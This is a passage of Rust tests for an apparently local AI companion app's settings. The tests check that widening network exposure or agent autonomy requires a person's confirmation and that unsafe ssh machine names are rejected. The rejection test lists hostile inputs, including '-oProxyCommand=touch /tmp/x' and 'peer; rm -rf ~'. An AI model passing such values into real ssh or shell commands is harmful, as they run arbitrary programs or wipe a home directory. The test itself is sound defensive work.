        assert_eq!(raised.len(), 5, "each raise is named once: {raised:?}");

        let mut lowered = before.clone();
        lowered.tool_boundary = ToolBoundary::ReadOnly;
        lowered.autonomy = Autonomy::Observe;
        lowered.notification_channels = Vec::new();
        assert!(
            before.high_risk_changes(&lowered).is_empty(),
            "taking something away is nobody's risk"
        );

        // What is already on stays there without a fresh confirmation.
        assert!(after.high_risk_changes(&after).is_empty());
    }

    #[test]
    fn every_step_that_widens_the_network_port_needs_a_person() {
        let closed = Settings::default();
        let loopback = Settings {
            network: NetworkSettings {
                enabled: true,
                ..NetworkSettings::default()
            },
            ..Settings::default()
        };
        let one = Settings {
            network: NetworkSettings {
                bind_address: "100.64.0.1".to_owned(),
                ..loopback.network.clone()
            },
            ..Settings::default()
        };
        let everything = Settings {
            network: NetworkSettings {
                bind_address: "0.0.0.0".to_owned(),
                ..loopback.network.clone()
            },
            ..Settings::default()
        };

        // Switching it on at all, which was already the case.
        assert_eq!(closed.high_risk_changes(&loopback).len(), 1);

        // Both steps outwards, each on its own.
        let raised = loopback.high_risk_changes(&one);
        assert_eq!(raised.len(), 1, "loopback to one interface: {raised:?}");
        assert!(raised[0].contains("further away"));
        assert_eq!(
            one.high_risk_changes(&everything).len(),
            1,
            "one interface to every interface"
        );
        assert_eq!(loopback.high_risk_changes(&everything).len(), 1);

        // Coming back in is nobody's risk, and neither is switching the port off.
        assert!(everything.high_risk_changes(&one).is_empty());
        assert!(one.high_risk_changes(&loopback).is_empty());
        assert!(loopback.high_risk_changes(&closed).is_empty());

        // A different address of the same reach is not a widening.
        let other_interface = Settings {
            network: NetworkSettings {
                bind_address: "192.0.2.9".to_owned(),
                ..one.network.clone()
            },
            ..Settings::default()
        };
        assert!(one.high_risk_changes(&other_interface).is_empty());

        // A moved port while the listener is open is named, in either direction.
        let moved = Settings {
            network: NetworkSettings {
                port: 47900,
                ..one.network.clone()
            },
            ..Settings::default()
        };
        let raised = one.high_risk_changes(&moved);
        assert_eq!(raised.len(), 1, "{raised:?}");
        assert!(raised[0].contains("while it is open"));
        assert_eq!(moved.high_risk_changes(&one).len(), 1);

        // A port set while the listener is off changes nothing anybody can reach.
        let closed_elsewhere = Settings {
            network: NetworkSettings {
                enabled: false,
                port: 47900,
                ..NetworkSettings::default()
            },
            ..Settings::default()
        };
        assert!(closed.high_risk_changes(&closed_elsewhere).is_empty());

        // And what is already on stays on without a fresh confirmation.
        assert!(everything.high_risk_changes(&everything).is_empty());
    }

    #[test]
    fn an_address_this_build_cannot_read_counts_as_the_widest() {
        assert_eq!(reach_of("127.0.0.1"), Reach::Loopback);
        assert_eq!(reach_of("::1"), Reach::Loopback);
        assert_eq!(reach_of("[::1]"), Reach::Loopback);
        assert_eq!(reach_of("100.64.0.1"), Reach::OneInterface);
        assert_eq!(reach_of("0.0.0.0"), Reach::Everything);
        assert_eq!(reach_of("::"), Reach::Everything);
        assert_eq!(reach_of(""), Reach::Everything);
        assert_eq!(
            reach_of("companion.local"),
            Reach::Everything,
            "what a name resolves to is not this build's to call narrow"
        );
        assert!(Reach::Loopback < Reach::OneInterface);
        assert!(Reach::OneInterface < Reach::Everything);
    }

    #[test]
    fn a_channel_that_stays_on_the_machine_needs_no_confirmation() {
        let before = Settings::default();
        let after = Settings {
            notification_channels: vec![
                NotificationChannel::Figure,
                NotificationChannel::Sound,
                NotificationChannel::Speech,
                NotificationChannel::SystemNotification,
            ],
            ..Settings::default()
        };
        assert!(before.high_risk_changes(&after).is_empty());
    }

    #[test]
    fn a_role_pointing_nowhere_is_refused_with_the_document() {
        let settings = Settings {
            endpoints: EndpointConfig::empty().with_role(
                EndpointRole::Stt,
                RoleBinding::new("a-profile-that-is-not-there"),
            ),
            ..Settings::default()
        };
        assert!(matches!(
            settings.validate(),
            Err(InvalidSettings::Endpoints(
                EndpointError::UnknownProfile { .. }
            ))
        ));
    }

    #[test]
    fn the_task_switch_is_off_at_the_factory_and_a_document_without_it_keeps_it_off() {
        let proactive = ProactiveSettings::default();
        assert!(!proactive.task_events);
        assert!(!proactive.watches(crate::ProactiveClass::TaskEvent));

        // A document written before the switch existed reads as off, not as on.
        let parsed: ProactiveSettings =
            serde_json::from_str(r#"{"session_stalled": false}"#).unwrap();
        assert!(!parsed.task_events);

        let on = ProactiveSettings {
            task_events: true,
            ..ProactiveSettings::default()
        };
        assert!(on.watches(crate::ProactiveClass::TaskEvent));
    }

    /// The worlds are read at the factory, from this machine only, and addressed to nobody
    /// until the person switches `world_events` on. A document from before the section reads
    /// the same way.
    #[test]
    fn the_worlds_are_read_here_and_said_to_nobody_until_the_person_asks() {
        let settings = Settings::default();
        assert!(settings.worlds.enabled);
        assert_eq!(settings.worlds.sources.len(), 1);
        assert!(settings.worlds.sources[0].is_local());
        assert!(!settings.proactive.world_events);
        assert!(
            !settings
                .proactive
                .watches(crate::ProactiveClass::WorldEvent)
        );

        let older: Settings = serde_json::from_str(r#"{"figure_name": "Fox"}"#).unwrap();
        assert_eq!(older.worlds, WorldsSettings::default());
        assert!(!older.proactive.world_events);
        older.validate().unwrap();
    }

    /// A machine name goes to `ssh` as its destination. One that starts with a hyphen would be
    /// an option there, and `-oProxyCommand=…` a program this machine starts.
    #[test]
    fn a_world_machine_that_ssh_would_read_as_an_option_is_refused() {
        for good in ["lokal", "peer", "ich@peer", "peer.tailnet-1.example.net"] {
            let mut settings = Settings::default();
            settings.worlds.sources[0].machine = good.to_owned();
            settings
                .validate()
                .unwrap_or_else(|error| panic!("{good}: {error}"));
        }
        for bad in [
            "",
            "-oProxyCommand=touch /tmp/x",
            "peer; rm -rf ~",
            "ich@-peer",
            "peer host",
            "a@b@c",
        ] {
            let mut settings = Settings::default();
            settings.worlds.sources[0].machine = bad.to_owned();
            assert!(
                matches!(
                    settings.validate(),
                    Err(InvalidSettings::WorldMachineInvalid { .. })
                ),
                "{bad:?} must be refused"
            );
        }
    }

    #[test]
    fn a_relative_workbench_directory_and_a_hurried_interval_are_refused() {
        let mut settings = Settings::default();
        settings.worlds.sources[0].cli_dir = "bin".to_owned();
        assert!(matches!(
            settings.validate(),
            Err(InvalidSettings::WorldCliDirNotAbsolute { .. })
        ));
        settings.worlds.sources[0].cli_dir = "~/AI/claude-workbench/shell".to_owned();
        settings.validate().unwrap();

        settings.worlds.poll_seconds = 5;
        assert!(matches!(
            settings.validate(),
            Err(InvalidSettings::WorldPollTooShort { .. })
        ));
        // Switched off, the interval is nobody's business.
        settings.worlds.enabled = false;
        settings.validate().unwrap();
    }

    /// Where the worlds are read names a program this machine starts and a machine it
    /// connects to. A phone decides neither.
    #[test]
    fn a_device_does_not_decide_where_the_worlds_are_read() {
        let current = Settings::default();
        let mut next = current.clone();
        next.worlds.sources[0].cli_dir = "/tmp/elsewhere".to_owned();
        assert!(
            current
                .device_forbidden_changes(&next)
                .iter()
                .any(|line| line.contains("worlds"))
        );
    }
}
